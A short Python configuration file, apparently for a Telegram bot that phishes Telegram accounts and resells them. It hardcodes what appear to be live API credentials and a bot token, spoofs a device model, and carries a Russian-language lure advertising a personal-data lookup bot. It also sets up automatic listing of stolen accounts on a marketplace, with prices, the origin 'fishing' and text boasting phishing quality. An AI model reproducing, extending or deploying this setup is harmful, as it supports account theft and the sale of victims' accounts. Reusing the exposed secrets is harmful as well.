#!/usr/bin/python
# -*- coding: utf-8 -*-

api_id = 8755368
api_hash = "8c6972552f881861bd7f95683ca12037"
API_TOKEN = "5811231521:AAGiEnXmK2grpp-ERqB2n4Y1Qfkgn08DMWE"
admin = 5540834347
updates = -1001760247933
device_model = "999 SM-G998B"
system_version = "SDK 31"
app_version = "8.4.1 (2522)"
lang_code = "en"
system_lang_code = "en-US"

SEND_MSG = '@{username} — Лучший бот для пробива'

# Lolz Setting
AUTO_SELL_LOLZ = False
LOLZ_KEY = ''
LOLZ_ACCOUNT_PRICE = 10
LOLZ_ACCOUNT_PREMIUM_PRICE = 50
LOLZ_ACCOUNT_TITLE = 'Телеграм | Прямо с печки | Лучшее качество'
LOLZ_ACCOUNT_ORIGIN = 'fishing'
LOLZ_ACCOUNT_DESCRIPTION = 'Лучшее качество фиша от мудреца Lipsi!'
